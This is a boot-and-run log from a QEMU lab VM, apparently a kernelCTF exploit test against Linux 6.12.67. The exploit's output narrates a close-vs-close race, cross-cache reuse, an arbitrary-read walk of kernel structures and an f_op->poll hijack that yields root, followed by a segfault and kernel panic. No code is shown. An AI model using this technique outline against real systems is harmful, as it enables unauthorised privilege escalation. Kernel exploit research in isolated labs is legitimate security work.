# Runtime Log

```
c[?7l[2J[0mSeaBIOS (version 1.17.0-10.fc44)


iPXE (https://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCBC10+7EF0BC10 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2J
============================================
  bad-epoll-lab — Tier 1 VM
  Kernel: 6.12.67
  User: uid=0 gid=0
============================================

Exploit is at /bin/exploit (if injected)
Run: /bin/exploit

X
[env] cpu model: QEMU Virtual CPU version 2.5+
[env] cpuinfo MHz: 1895.998
[+] target: kernelctf lts-6.12.67
[*] KASLR leak bypassed (nokaslr assumed).
[+] kernel_base=ffffffff81000000
[*] Calibrated close() average: 4096 cycles, threshold set to: 150000 cycles
[+] race setup done
[*] racing close-vs-close...
[*] racer: false-sharing window=132944 ns -> fire 66472 ns ahead
[+] racer: stat done (10 iters) -> locked best range [750,2250] (interrupts=32)
[+] race won: retries=401 launch=1248 cc_retries=1
[*] cross-cache...
[+] cross-cache ok (init_task.comm=swapper)
[*] AAR: find task (comm=exploit)...
[+] task=ffff888003d98000
[+] files=ffff888003da8000 fdt=ffff8880075b7680 fd_array=ffff8880075e2000
[+] file=ffff888007471f00 pipe=ffff8880074e8180 bufs=ffff8880076f7000 page=ffffea00001c3c40
[+] vmemmap_base=ffffea0000000000 page_offset_base=ffff888000000000
[+] rop_page virt=ffff8880070f1000
[*] RIP: fire f_op->poll hijack (virt=ffff8880070f1000)...
READY_FOR_GDB
Win! UID: 0, GID: 0, EUID: 0
[-] Segfault detected
  Signal: 11 (Segmentation fault)
  Faulting Address (si_addr): (nil)
  Instruction Pointer (RIP):  0x40b865
[    9.551879] Kernel panic - not syncing: Attempted to kill init! exitcode=0x00000100
[    9.553754] CPU: 0 UID: 0 PID: 71 Comm: slowme Not tainted 6.12.67 #1
[    9.554034] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
[    9.554522] Call Trace:
[    9.555798]  <TASK>
[    9.556161]  dump_stack_lvl+0x4d/0x70
[    9.556795]  panic+0x10d/0x314
[    9.556971]  ? sysvec_reschedule_ipi+0x21/0xf0
[    9.557192]  do_exit.cold+0x41/0x41
[    9.557393]  do_group_exit+0x28/0xb0
[    9.557623]  get_signal+0x864/0x900
[    9.557811]  ? pick_task_fair+0x44/0xc0
[    9.557985]  arch_do_signal_or_restart+0x73/0x2a0
[    9.558192]  syscall_exit_to_user_mode+0x95/0xe0
[    9.558385]  do_syscall_64+0xab/0x1a0
[    9.558547]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    9.559041] RIP: 0033:0x59173b
[    9.559671] Code: 73 01 c3 48 c7 c1 e8 ff ff ff f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa b8 18 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 e8 ff ff ff f7 d8 64 89 01 48
[    9.560386] RSP: 002b:00007fef251280c8 EFLAGS: 00000246 ORIG_RAX: 0000000000000018
[    9.560768] RAX: 0000000000000000 RBX: 00000000000004e0 RCX: 000000000059173b
[    9.561066] RDX: 0000000000000002 RSI: 0000000000000000 RDI: 0000000000000107
[    9.561363] RBP: 0000000000000002 R08: 0000000000000000 R09: 0000000000000000
[    9.561686] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
[    9.561994] R13: 0000000085bf6555 R14: 0000000000000001 R15: 00000000000000c9
[    9.562347]  </TASK>
[    9.563510] Kernel Offset: disabled
[    9.564058] Rebooting in 1 seconds..
```
